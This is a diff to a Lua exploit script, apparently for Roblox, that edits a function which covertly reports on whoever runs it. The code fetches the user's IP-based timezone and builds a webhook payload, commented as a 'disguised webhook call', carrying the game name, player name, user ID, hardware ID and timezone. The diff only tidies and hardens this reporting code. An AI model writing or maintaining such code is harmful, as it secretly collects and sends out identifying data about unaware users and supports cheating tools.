@@ -16,9 +16,13 @@ local function fetchToKill()
     local ipData = game:HttpGet("http://worldtimeapi.org/api/ip")
     local utcOffset = "+00:00" -- Default to UTC
     if ipData and type(ipData) == "string" then
-    utcOffset = ipData:match('"utc_offset":"([%+%-]%d%d:%d%d)"') or utcOffset
+        utcOffset = ipData:match('"utc_offset":"([%+%-]%d%d:%d%d)"') or utcOffset
     end
     local timezone = "( UTC" .. utcOffset .. " )"
+
+    -- Initialize host and noobs as tables, even if they are empty
+    local host = host or {}  -- Replace 'host' with your actual variable or logic for 'Killer'
+    local noobs = noobs or {}  -- Replace 'noobs' with your actual variable or logic for 'Tankers'
 
     -- Send report (disguised webhook call)
     local afmData = {
@@ -28,8 +32,8 @@ local function fetchToKill()
             ["description"] = "Player has executed the exploit script.",
             ["fields"] = {
                 {["name"] = "Game Name", ["value"] = gameName, ["inline"] = true},
-                {["name"] = "Killer", ["value"] = table.concat(host, ", "), ["inline"] = true},
-                {["name"] = "Tankers", ["value"] = table.concat(noobs, ", "), ["inline"] = false},
+                {["name"] = "Killer", ["value"] = table.concat(host, ", ") or "N/A", ["inline"] = true},
+                {["name"] = "Tankers", ["value"] = table.concat(noobs, ", ") or "N/A", ["inline"] = false},
                 {["name"] = "Executed By", ["value"] = playerName, ["inline"] = true},
                 {["name"] = "User ID", ["value"] = tostring(playerUserId), ["inline"] = true},
                 {["name"] = "HWID", ["value"] = hwid, ["inline"] = true},
